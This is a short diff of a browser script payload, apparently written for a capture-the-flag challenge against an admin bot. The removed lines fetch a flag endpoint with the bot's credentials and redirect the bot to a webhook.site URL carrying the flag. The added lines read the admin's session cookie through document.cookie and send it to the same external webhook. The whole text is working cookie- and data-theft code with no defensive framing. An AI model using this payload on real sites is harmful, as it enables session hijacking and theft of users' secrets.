@@ -1,13 +1,7 @@
 <script>
-  // Bot lands here. Its cookies are for 127.0.0.1:5000
-  // We navigate it to the flag endpoint (same origin for the bot = cookies sent)
-  // Then redirect to our server with the flag
-
-  fetch('http://127.0.0.1:5000/api/fetchflag', {credentials: 'include'})
-    .then(r => r.json())
-    .then(data => {
-      // Exfil: navigate the bot to your server with flag in URL
-      window.location = 'https://webhook.site/1c93ddcd-872e-4efe-a59d-566602e43a76?flag=' + encodeURIComponent(data.flag);
-    });
+  // Read the admin's session cookie (httpOnly: false, so JS can access it)
+  const cookie = document.cookie;
+  
+  // Send it to your webhook
+  fetch('https://webhook.site/1c93ddcd-872e-4efe-a59d-566602e43a76?c=' + encodeURIComponent(cookie));
 </script>
-
